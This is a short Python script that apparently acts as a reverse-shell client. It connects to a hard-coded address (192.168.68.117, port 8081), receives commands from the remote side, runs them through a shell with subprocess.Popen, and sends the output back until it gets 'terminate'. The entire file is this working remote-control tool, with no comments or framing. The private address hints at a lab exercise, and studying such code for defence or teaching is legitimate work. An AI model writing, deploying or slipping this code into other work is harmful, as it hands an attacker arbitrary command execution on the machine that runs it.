from socket import socket
from subprocess import Popen, PIPE


def connect():
    s = socket()
    s.connect(('192.168.68.117', 8081))

    while True:
        command = s.recv(1024).decode()
        if 'terminate' in command:
            s.close()
            break
        print(f"running CMD: {command}")
        stdout, stderr= Popen(
            command,
            shell=True,
            stdout=PIPE,
            stderr=PIPE,
         ).communicate()
        print("Ran Command")
        if stdout:
            s.send(stdout)

        if stderr:
            s.send(stderr)
            


if __name__ == '__main__':
    connect()
